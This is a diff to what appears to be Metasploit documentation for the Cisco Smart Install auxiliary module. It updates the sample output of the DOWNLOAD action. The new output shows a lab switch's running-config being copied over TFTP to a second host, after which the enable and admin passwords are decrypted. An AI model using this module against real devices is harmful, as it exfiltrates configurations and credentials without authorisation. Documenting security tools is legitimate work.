@@ -47,15 +47,15 @@ msf auxiliary(cisco_smart_install) > run
 Using the `DOWNLOAD` action
 
   ```
-msf auxiliary(cisco_smart_install) > run
-[*] a.b.c.d:4786   - Starting TFTP Server...
-[+] a.b.c.d:4786   - Fingerprinted the Cisco Smart Install protocol
-[*] a.b.c.d:4786   - Requesting configuration from device...
-[*] a.b.c.d:4786   - Waiting 60 seconds for configuration
-[*] a.b.c.d:4786   - Incoming file from a.b.c.d - GZjWgnqv 3015 bytes
-[*] a.b.c.d:4786   - Providing some time for transfers to complete...
-[*] a.b.c.d:4786   - Shutting down the TFTP service...
+[*] 192.168.0.26:4786      - Starting TFTP Server...
+[+] 192.168.0.26:4786      - Fingerprinted the Cisco Smart Install protocol
+[*] 192.168.0.26:4786      - Attempting copy system:running-config tftp://192.168.0.11/kWqjngYF
+[*] 192.168.0.26:4786      - Waiting 60 seconds for configuration
+[*] 192.168.0.26:4786      - Incoming file from 192.168.0.26 - kWqjngYF (31036 bytes)
+[+] 192.168.0.26:4786      - 192.168.0.26:4786 Decrypted Enable Password: testcase
+[+] 192.168.0.26:4786      - 192.168.0.26:4786 Username 'admin' with Decrypted Password: testcase)
+[*] 192.168.0.26:4786      - Providing some time for transfers to complete...
+[*] 192.168.0.26:4786      - Shutting down the TFTP service...
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-
 ```
